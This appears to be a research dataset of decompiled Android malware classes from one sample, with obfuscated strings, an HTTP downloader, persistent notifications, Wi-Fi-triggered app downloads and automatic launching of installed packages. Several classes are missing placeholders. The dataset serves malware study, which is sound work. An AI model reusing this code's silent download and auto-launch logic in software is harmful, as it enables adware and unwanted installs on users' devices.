"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\i.code","public class i implements Runnable {   final int a;   final g b;   public i(  g gVar,  int i){     this.b=gVar;     this.a=i;   }   @Override public void run(){     String b;     Notification notification;     Notification notification2;     Context context;     com.baty.pczy.facy.pap.e.f fVar;     PendingIntent pendingIntent;     NotificationManager notificationManager;     com.baty.pczy.facy.pap.e.f fVar2;     Notification notification3;     b=this.b.b(this.a);     notification=this.b.f69c;     notification.flags=0;     notification2=this.b.f69c;     context=this.b.a;     fVar=this.b.b;     String str=fVar.a;     pendingIntent=this.b.g;     notification2.setLatestEventInfo(context,str,b,pendingIntent);     notificationManager=this.b.d;     fVar2=this.b.b;     int i=fVar2.p;     notification3=this.b.f69c;     notificationManager.notify(i,notification3);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.i\j.code","public class j implements Runnable {   final g a;   public j(  g gVar){     this.a=gVar;   }   @Override public void run(){     com.baty.pczy.facy.pap.e.f fVar;     Context context;     com.baty.pczy.facy.pap.e.f fVar2;     String b;     Context context2;     com.baty.pczy.facy.pap.e.f fVar3;     Context context3;     com.baty.pczy.facy.pap.e.f fVar4;     NotificationManager notificationManager;     com.baty.pczy.facy.pap.e.f fVar5;     fVar=this.a.b;     Notification notification=new Notification(R.drawable.stat_sys_download_done,fVar.a,System.currentTimeMillis());     context=this.a.a;     Intent intent=new Intent(context,(Class<?>)com.baty.pczy.facy.pap.e.i);     intent.setType(com.baty.pczy.facy.pap.c.e);     notification.flags|=32;     String simpleName=com.baty.pczy.facy.pap.e.f.class.getSimpleName();     fVar2=this.a.b;     intent.putExtra(simpleName,fVar2);     b=g.b(new byte[]{-28,-72,-117,-24,-67,-67,-27,-82,-116,-26,-120,-112});     context2=this.a.a;     fVar3=this.a.b;     PendingIntent service=PendingIntent.getService(context2,fVar3.p,intent,134217728);     context3=this.a.a;     fVar4=this.a.b;     notification.setLatestEventInfo(context3,fVar4.a,b,service);     notificationManager=this.a.d;     fVar5=this.a.b;     notificationManager.notify(fVar5.p,notification);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\a.code","public class a extends e {   private HttpClient b;   public a(  Context context,  h hVar){     super(context,hVar);   }   @Override public boolean a(){     HttpRequestBase httpRequestBase;     if (c()) {       if (!l()) {         a(-4);         return false;       }       a((Exception)null);       a(-2);       this.b=new DefaultHttpClient();       float j=j();       if (j > 0.0f) {         this.b.getParams().setParameter(""http.socket.timeout"",Integer.valueOf((int)(j * 1000.0f)));         this.b.getParams().setParameter(""http.connection.timeout"",Integer.valueOf((int)(j * 1000.0f)));       }       g k=k();       if (k != null) {         this.b.getParams().setParameter(""http.route.default-proxy"",new HttpHost(k.a(),k.b(),""http""));       }       h d=d();       if (d.b() == 0) {         httpRequestBase=new HttpGet(d.toString());       }  else {         HttpPost httpPost=new HttpPost(d.c());         try {           httpPost.setEntity(new StringEntity(d.d()));         }  catch (        UnsupportedEncodingException e) {           com.baty.pczy.facy.pap.f.g.a((Exception)e);         }         httpRequestBase=httpPost;       }       Map a=d.a();       for (      String str : a.keySet()) {         httpRequestBase.addHeader(str,a.get(str).toString());       }       try {         HttpResponse execute=this.b.execute(httpRequestBase);         int statusCode=execute.getStatusLine().getStatusCode();         HashMap hashMap=new HashMap();         for (        Header header : execute.getAllHeaders()) {           hashMap.put(header.getName(),header.getValue());         }         a(hashMap);         a(execute.getEntity().getContent());         if (("""" + statusCode).startsWith(""2"")) {           a(200);           return true;         }       }  catch (      Exception e2) {         com.baty.pczy.facy.pap.f.g.a(e2);         a(e2);         a(-3);       } catch (      OutOfMemoryError e3) {         a((Exception)null);         a(-3);       }     }     return false;   }   @Override public void b(){     if (c()) {       return;     }     if (this.b != null) {       this.b.getConnectionManager().shutdown();     }     a((Map)null);     a((InputStream)null);     a((Exception)null);     a(-3);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\b.code","public class b {   private boolean a=false;   private List b=new ArrayList();   public b(){     a(2);   }   private c a(){     c cVar=null;     for (    c cVar2 : this.b) {       cVar2.a();       if (cVar != null && cVar2.size() >= cVar.size()) {         cVar2=cVar;       }       cVar=cVar2;     }     return cVar;   }   public boolean b(  e eVar){     return eVar.a();   }   public void a(  int i){     if (this.b.size() < i) {       int size=i - this.b.size();       for (int i2=0; i2 < size; i2++) {         this.b.add(new c(this));       }     }   }   public void a(  e eVar){     eVar.a(-1);     if (this.a) {       b(eVar);       return;     }     c a=a();     if (a != null) {       a.add(eVar);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\c.code","public class c extends ConcurrentLinkedQueue {   final b a;   private Thread b;   private int f70c=new Random().nextInt();   public c(  b bVar){     this.a=bVar;   }   public void a(){     Iterator it=iterator();     while (it.hasNext()) {       if (((e)it.next()).h() == -3) {         it.remove();       }     }   }   @Override public boolean add(  e eVar){     boolean add=super.add(eVar);     if (add && this.b == null) {       this.b=new d(this);       this.b.start();     }     return add;   }   @Override public String toString(){     return com.baty.pczy.facy.pap.s.a.a(new byte[]{72,116,116,112,67,111,110,110,101,99,116,105,111,110,81,117,101,117,101,64}) + this.f70c;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\d.code","public class d extends Thread {   final c a;   public d(  c cVar){     this.a=cVar;   }   @Override public void run(){     int i;     int i2=0;     while (true) {       e eVar=(e)this.a.peek();       if (eVar == null) {         this.a.b=null;         return;       }       if ((eVar.h() == -1 ? this.a.a.b(eVar) : false) || i2 > 1) {         this.a.poll();         i=0;       }  else {         i=i2 + 1;       }       i2=i;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6d9645f9"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\f.code","public interface f {   void a(  e eVar,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\g.code","public class g {   private String a;   private int b;   public g(  String str,  int i){     this.a=str;     this.b=i;   }   public String a(){     return this.a;   }   public int b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\h.code","public class h {   private String a;   private int d=0;   private Map b=new LinkedHashMap();   private Map f72c=new LinkedHashMap();   public h(  String str){     this.a=str;   }   public Map a(){     return this.f72c;   }   public void a(  String str,  Object obj){     this.f72c.put(str,obj);   }   public int b(){     return this.d;   }   public String c(){     return this.a;   }   public String d(){     if (this.b.isEmpty()) {       return """";     }     ArrayList arrayList=new ArrayList();     for (    String str : this.b.keySet()) {       Object obj=this.b.get(str);       if (obj != null) {         arrayList.add(new BasicNameValuePair(str,obj.toString()));       }     }     return URLEncodedUtils.format(arrayList,""utf-8"");   }   public String toString(){     String d=d();     return d.equals("""") ? this.a : this.a + ""?"" + d;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\i.code","public interface i {   String a();   boolean b();   boolean c(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.j\j.code","public class j implements i {   private static j b;   private Context a;   private j(  Context context){     this.a=context;   }   public static i a(  Context context){     if (b == null) {       b=new j(context);     }     return b;   }   @Override public String a(){     NetworkInfo activeNetworkInfo=((ConnectivityManager)this.a.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return """";     }     String typeName=activeNetworkInfo.getTypeName();     String extraInfo=activeNetworkInfo.getExtraInfo();     return !typeName.toLowerCase().startsWith(""wi"") ? (extraInfo == null || extraInfo.length() <= 0) ? activeNetworkInfo.getTypeName() : extraInfo : typeName;   }   @Override public boolean b(){     NetworkInfo activeNetworkInfo=((ConnectivityManager)this.a.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo != null) {       return activeNetworkInfo.isAvailable() || activeNetworkInfo.isConnectedOrConnecting();     }     return false;   }   @Override public boolean c(){     return ""wifi"".endsWith(a().toLowerCase());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\a.code","public class a {   public static TranslateAnimation a;   public static TranslateAnimation b;   public static TranslateAnimation f73c;   public static TranslateAnimation d;   public static void a(  Animation.AnimationListener animationListener,  Animation.AnimationListener animationListener2){     a=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     a.setDuration(450L);     a.setFillAfter(false);     b=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     b.setDuration(450L);     b.setFillAfter(false);     if (animationListener != null) {       b.setAnimationListener(animationListener);     }     f73c=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);     f73c.setDuration(450L);     f73c.setFillAfter(false);     if (animationListener2 != null) {       f73c.setAnimationListener(animationListener2);     }     d=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);     d.setDuration(450L);     d.setFillAfter(false);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\b.code","public class b extends s implements View.OnClickListener, com.baty.pczy.facy.pap.d.a {   private Activity a;   private com.baty.pczy.facy.pap.e.f b;   private m f74c;   private com.baty.pczy.facy.pap.t.a d;   public b(  Activity activity,  m mVar,  com.baty.pczy.facy.pap.e.f fVar){     this.a=activity;     this.b=fVar;     this.f74c=mVar;   }   private void a(  Activity activity,  com.baty.pczy.facy.pap.e.f fVar){     this.d=new com.baty.pczy.facy.pap.t.a(activity,fVar);   }   @Override public void a(){     a(this.a,this.b);   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  int i){     com.baty.pczy.facy.pap.d.a f=this.d.f();     if (f != null) {       f.a(fVar,i);     }   }   @Override public void a(  com.baty.pczy.facy.pap.d.f fVar,  long j){     com.baty.pczy.facy.pap.d.a f=this.d.f();     if (f != null) {       f.a(fVar,j);     }   }   @Override public boolean b(){     if (!this.d.c()) {       return false;     }     this.d.d();     return true;   }   @Override public View c(){     return this.d;   }   @Override public void d(){     this.d.e();   }   @Override public void e(){     this.d.b();   }   public boolean equals(  Object obj){     if (obj == null || !(obj instanceof b)) {       return false;     }     return this.b.equals(((b)obj).b);   }   public int hashCode(){     return this.b.hashCode();   }   @Override public void onClick(  View view){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\c.code","public class c extends h implements View.OnClickListener {   private Context d;   private ArrayList e=new ArrayList();   public c(  Context context){     this.d=context;   }   @Override protected View a(  int i,  View view,  ViewGroup viewGroup){     com.baty.pczy.facy.pap.t.g gVar=view == null ? new com.baty.pczy.facy.pap.t.g(this.d) : (com.baty.pczy.facy.pap.t.g)view;     com.baty.pczy.facy.pap.e.f fVar=(com.baty.pczy.facy.pap.e.f)this.e.get(i);     int i2=fVar.p;     gVar.a(i2);     gVar.setTag(Integer.valueOf(i2));     gVar.setLayoutParams(new AbsListView.LayoutParams(-1,-1));     gVar.a(fVar);     gVar.a(fVar.a);     gVar.b(fVar.h);     gVar.c(fVar.k);     gVar.a(false);     com.baty.pczy.facy.pap.b.b.a(this.d).a(gVar.a(),fVar.f60c,com.baty.pczy.facy.pap.f.d.d(fVar),null,com.baty.pczy.facy.pap.b.e.Type_icon);     gVar.a(this,i);     if (com.baty.pczy.facy.pap.s.a.d(this.d,fVar.a)) {       gVar.a(true);     }     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},new ColorDrawable(-2038553));     stateListDrawable.addState(new int[]{R.attr.state_enabled},new ColorDrawable(-657931));     gVar.setBackgroundDrawable(stateListDrawable);     return gVar;   }   public void a(  List list){     this.e.addAll(list);     notifyDataSetChanged();     if (((com.baty.pczy.facy.pap.e.f)list.get(list.size() - 1)).e > this.e.size()) {       b();     }  else {       a();     }   }   @Override public int getCount(){     return this.e.size();   }   @Override public Object getItem(  int i){     return this.e.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public void onClick(  View view){     Object tag=view.getTag();     if (tag instanceof Integer) {       com.baty.pczy.facy.pap.f.b.a(this.d,(com.baty.pczy.facy.pap.e.f)getItem(((Integer)tag).intValue()));     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\d.code","public class d extends s implements AdapterView.OnItemClickListener, j {   private Activity a;   private m b;   private LinearLayout f75c;   private k d;   private FrameLayout e;   private ViewFlipper f;   private ProgressBar g;   private int h;   private c i;   private boolean j;   private Handler k=new e(this);   public d(  Activity activity,  m mVar,  int i){     this.a=activity;     this.b=mVar;     this.h=i;     this.f75c=new LinearLayout(activity);     a(this.f75c);   }   private void a(  LinearLayout linearLayout){     linearLayout.setBackgroundColor(-16776961);     linearLayout.setOrientation(1);     LinearLayout linearLayout2=new LinearLayout(this.a);     linearLayout2.setBackgroundColor(-16740913);     linearLayout.addView(linearLayout2,new LinearLayout.LayoutParams(-1,3));     ViewGroup.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     this.e=new FrameLayout(this.a);     this.e.setBackgroundDrawable(com.baty.pczy.facy.pap.s.g.a(this.a,49));     FrameLayout.LayoutParams layoutParams2=new FrameLayout.LayoutParams(-2,-2);     layoutParams2.gravity=17;     TextView textView=new TextView(this.a);     textView.setText(com.baty.pczy.facy.pap.p.a.bn);     textView.setTextColor(-16777216);     textView.setTextSize(25.0f);     textView.setSingleLine(true);     textView.setPadding(0,com.baty.pczy.facy.pap.s.a.a(this.a,5),0,com.baty.pczy.facy.pap.s.a.a(this.a,5));     this.e.addView(textView,layoutParams2);     linearLayout.addView(this.e,layoutParams);     this.f=new ViewFlipper(this.a);     this.d=new k(this.a);     this.d.setOnItemClickListener(this);     this.d.setDivider(null);     this.d.setBackgroundColor(-2630690);     this.d.setDividerHeight(1);     this.d.setFadingEdgeLength(0);     this.d.a(f());     this.i=new c(this.a);     this.i.a(this.d);     this.i.a(this);     this.d.setAdapter((ListAdapter)this.i);     this.f.addView(this.d,-1,-1);     LinearLayout linearLayout3=new LinearLayout(this.a);     linearLayout3.setBackgroundColor(-1);     linearLayout3.setGravity(17);     this.g=new ProgressBar(this.a);     linearLayout3.addView(this.g,-2,-2);     this.f.addView(linearLayout3,-1,-1);     LinearLayout linearLayout4=new LinearLayout(this.a);     linearLayout4.setBackgroundColor(-1);     linearLayout4.setGravity(17);     TextView textView2=new TextView(this.a);     textView2.setTextColor(-16777216);     textView2.setTextSize(18.0f);     textView2.setText(com.baty.pczy.facy.pap.p.a.cb);     textView2.setOnClickListener(new f(this));     linearLayout4.addView(textView2);     this.f.addView(linearLayout4,-1,-1);     g();     linearLayout.addView(this.f,-1,-1);     j();   }   private View f(){     LinearLayout linearLayout=new LinearLayout(this.a);     LinearLayout linearLayout2=new LinearLayout(this.a);     linearLayout2.setBackgroundColor(-16777216);     linearLayout.addView(linearLayout2,-1,1);     linearLayout.setOrientation(1);     linearLayout.setGravity(17);     ProgressBar progressBar=new ProgressBar(this.a,null,R.attr.progressBarStyleHorizontal);     progressBar.setIndeterminate(true);     linearLayout.addView(progressBar,-1,com.baty.pczy.facy.pap.s.a.a(this.a,8));     return linearLayout;   }   private void g(){     this.f.setDisplayedChild(1);   }   public void h(){     this.f.setDisplayedChild(2);   }   public void i(){     this.f.setDisplayedChild(0);   }   public void j(){     if (this.j) {       return;     }     this.j=false;     com.baty.pczy.facy.pap.q.d.a(new g(this));   }   @Override public void a(  int i){     j();   }   @Override public View c(){     return this.f75c;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     com.baty.pczy.facy.pap.d.f(this.a,(com.baty.pczy.facy.pap.e.f)this.i.getItem(i));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2ce8db86"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\f.code","public class f implements View.OnClickListener {   final d a;   public f(  d dVar){     this.a=dVar;   }   @Override public void onClick(  View view){     ViewFlipper viewFlipper;     viewFlipper=this.a.f;     viewFlipper.setDisplayedChild(1);     this.a.j();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\g.code","public class g implements com.baty.pczy.facy.pap.q.a {   final d a;   public g(  d dVar){     this.a=dVar;   }   @Override public void a(){     int i;     c cVar;     Handler handler;     Handler handler2;     com.baty.pczy.facy.pap.e.a aVar=new com.baty.pczy.facy.pap.e.a();     aVar.a=com.baty.pczy.facy.pap.e.b.b();     i=this.a.h;     aVar.f58c=i;     cVar=this.a.i;     aVar.b=cVar.getCount();     com.baty.pczy.facy.pap.e.f[] a=com.baty.pczy.facy.pap.e.e.a(aVar);     handler=this.a.k;     Message obtainMessage=handler.obtainMessage();     obtainMessage.what=1;     obtainMessage.obj=a;     handler2=this.a.k;     handler2.sendMessage(obtainMessage);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\h.code","!org.eclipse.jdt.core.dom.TypeDeclaration@278e2cc8"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\i.code","public interface i {   void a();   void b(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\j.code","public interface j {   void a(  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\k.code","public class k extends ListView implements i {   private View a;   private boolean b;   private h f77c;   public k(  Context context){     super(context);     this.b=false;   }   @Override public void a(){     if (this.a != null) {       removeFooterView(this.a);     }     this.b=false;   }   public void a(  View view){     this.a=view;   }   @Override public void b(){     if (this.b || this.a == null) {       return;     }     addFooterView(this.a);     this.b=true;   }   @Override public void setAdapter(  ListAdapter listAdapter){     if (!(listAdapter instanceof h)) {       throw new IllegalArgumentException();     }     if (this.f77c != null) {       this.f77c.a((i)null);       setOnScrollListener(null);     }     this.f77c=(h)listAdapter;     ((h)listAdapter).a(this);     View view=new View(getContext());     super.addFooterView(view);     super.setAdapter(listAdapter);     super.removeFooterView(view);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\l.code","public interface l {   void a();   boolean b();   View c();   void d();   void e(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\m.code","public interface m extends l { } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\n.code","!org.eclipse.jdt.core.dom.TypeDeclaration@ceaf12b"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\o.code","public class o {   public static o a;   private Activity b;   private m f79c;   private Map d=new HashMap();   private o(  Activity activity,  m mVar){     this.b=activity;     this.f79c=mVar;   }   public static o a(  Activity activity,  m mVar){     if (a == null) {       a=new o(activity,mVar);     }     return a;   }   public l a(  com.baty.pczy.facy.pap.e.f fVar){     if (this.d.containsKey(fVar)) {       return (l)this.d.get(fVar);     }     b bVar=new b(this.b,this.f79c,fVar);     this.d.put(fVar,bVar);     return bVar;   }   public l b(  com.baty.pczy.facy.pap.e.f fVar){     if (this.d.containsKey(fVar)) {       return (l)this.d.get(fVar);     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\p.code","public class p extends s implements m {   private Activity b;   private FrameLayout f80c;   private n d;   private Stack a=new Stack();   private Animation.AnimationListener e=new q(this);   private Animation.AnimationListener f=new r(this);   public p(  Activity activity){     this.b=activity;     this.f80c=new FrameLayout(activity);     this.f80c.setBackgroundColor(-1);     a.a(this.e,this.f);   }   private void b(  l lVar){     int i=0;     int size=this.a.size();     while (i < size) {       l lVar2=(l)this.a.get(i);       if (lVar2.equals(lVar)) {         this.a.remove(lVar2);         this.f80c.removeView(lVar2.c());         i=0;         size=this.a.size();       }  else {         i++;       }     }   }   private void h(){     if (this.d == null || this.d.a != 2) {       return;     }     this.d.b();   }   public void a(  l lVar){     h();     b(lVar);     l g=g();     lVar.a();     this.a.push(lVar);     View c2=lVar.c();     this.f80c.addView(c2,-1,-1);     if (g != null) {       c2.startAnimation(a.b);     }   }   public void a(  n nVar){     this.d=nVar;   }   @Override public boolean b(){     if (this.a.size() > 0) {       if (g().b()) {         return true;       }       if (this.a.size() > 1) {         f();         return true;       }     }     return false;   }   @Override public View c(){     return this.f80c;   }   @Override public void d(){     l g=g();     if (g != null) {       g.d();     }   }   public l f(){     l lVar=(l)this.a.pop();     View c2=lVar.c();     c2.startAnimation(a.f73c);     this.f80c.removeView(c2);     g().d();     return lVar;   }   public l g(){     if (this.a.size() > 0) {       return (l)this.a.peek();     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\q.code","public class q implements Animation.AnimationListener {   final p a;   public q(  p pVar){     this.a=pVar;   }   @Override public void onAnimationEnd(  Animation animation){     Stack stack;     Stack stack2;     Stack stack3;     stack=this.a.a;     if (stack.size() >= 2) {       stack2=this.a.a;       stack3=this.a.a;       ((l)stack2.get(stack3.size() - 2)).e();     }   }   @Override public void onAnimationRepeat(  Animation animation){   }   @Override public void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\r.code","class r implements Animation.AnimationListener {   final p a;   public r(  p pVar){     this.a=pVar;   }   @Override public void onAnimationEnd(  Animation animation){   }   @Override public void onAnimationRepeat(  Animation animation){   }   @Override public void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.k\s.code","public class s implements l {   @Override public void a(){   }   @Override public boolean b(){     return false;   }   @Override public View c(){     return null;   }   @Override public void d(){   }   @Override public void e(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\a.code","public class a implements b {   private Context a;   public a(  Context context,  Intent intent){     this.a=context;   }   @Override public void a(){     com.baty.pczy.facy.pap.f.a.a(this.a,Integer.MAX_VALUE);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\b.code","public interface b {   void a(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\c.code","public class c implements b {   private Context a;   public c(  Context context,  Intent intent){     this.a=context;   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo;     try {       ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");       if (connectivityManager != null && (activeNetworkInfo=connectivityManager.getActiveNetworkInfo()) != null && activeNetworkInfo.isConnected()) {         if (activeNetworkInfo.getState() == NetworkInfo.State.CONNECTED) {           return true;         }       }     }  catch (    Exception e) {     }     return false;   }   public void b(  Context context){     if (((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo() != null) {       if (""wifi"".equalsIgnoreCase(j.a(this.a).a())) {         String f=com.baty.pczy.facy.pap.e.a.f();         com.baty.pczy.facy.pap.e.a.g();         if (!TextUtils.isEmpty(f)) {           String[] split=f.split("","");           for (          String str : split) {             com.baty.pczy.facy.pap.e.f c2=com.baty.pczy.facy.pap.e.a.c(Integer.valueOf(str).intValue());             if (c2 != null) {               com.baty.pczy.facy.pap.f.b.a(this.a,c2);             }           }           return;         }       }       com.baty.pczy.facy.pap.f.b.a(this.a);     }   }   @Override public void a(){     com.baty.pczy.facy.pap.q.d.a(new d(this));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\d.code","class d implements com.baty.pczy.facy.pap.q.a {   final c a;   public d(  c cVar){     this.a=cVar;   }   @Override public void a(){     Context context;     Context context2;     try {       Thread.sleep(5000L);     }  catch (    InterruptedException e) {       com.baty.pczy.facy.pap.f.g.a((Exception)e);     }     context=this.a.a;     if (c.a(context)) {       c cVar=this.a;       context2=this.a.a;       cVar.b(context2);       com.baty.pczy.facy.pap.e.d.a(5);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\e.code","public class e implements b {   private static Set d=new HashSet();   private Context a;   private String b;   private h f81c;   public e(  Context context,  String str,  h hVar){     this.a=context;     this.b=str;     this.f81c=hVar;   }   public static void a(  g gVar){     d.add(gVar);   }   @Override public void a(){     com.baty.pczy.facy.pap.e.f f=com.baty.pczy.facy.pap.e.a.f(this.b);     if (f == null) {       return;     }     ((NotificationManager)this.a.getSystemService(""notification"")).cancel(f.p);     Iterator it=d.iterator();     while (it.hasNext()) {       ((g)it.next()).a(f);     }     if (!com.baty.pczy.facy.pap.e.b.d(this.b) || com.baty.pczy.facy.pap.f.f.a(com.baty.pczy.facy.pap.e.b.e(this.b))) {       com.baty.pczy.facy.pap.q.d.a(new f(this));       String a=com.baty.pczy.facy.pap.e.a.a(f.p);       if (TextUtils.isEmpty(a) || !a.contains(""3"") || a.contains(""4"")) {         return;       }       File a2=com.baty.pczy.facy.pap.f.d.a(f);       if (a2.exists()) {         a2.delete();       }       if (this.f81c == h.Type_Real_Time) {         this.a.startActivity(this.a.getPackageManager().getLaunchIntentForPackage(this.b));       }       j jVar=new j();       jVar.b=4;       jVar.a=f.p;       jVar.f62c=f.u;       com.baty.pczy.facy.pap.e.a.a(jVar.a,jVar.b);       com.baty.pczy.facy.pap.o.a.a(jVar);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\f.code","public class f implements com.baty.pczy.facy.pap.q.a {   final e a;   public f(  e eVar){     this.a=eVar;   }   @Override public void a(){     String str;     String str2;     try {       Thread.sleep((new Random().nextInt(5) + 20) * 1000);     }  catch (    InterruptedException e) {       com.baty.pczy.facy.pap.f.g.a((Exception)e);     }     com.baty.pczy.facy.pap.c.a aVar=com.baty.pczy.facy.pap.e.b;     str=this.a.b;     if (aVar.d(str)) {       return;     }     com.baty.pczy.facy.pap.c.a aVar2=com.baty.pczy.facy.pap.e.b;     str2=this.a.b;     aVar2.c(str2);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\g.code","public interface g {   void a(  com.baty.pczy.facy.pap.e.f fVar); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.l\i.code","public class i implements b {   public i(  Context context,  Intent intent){   }   @Override public void a(){     com.baty.pczy.facy.pap.e.d.a(5);   } } "
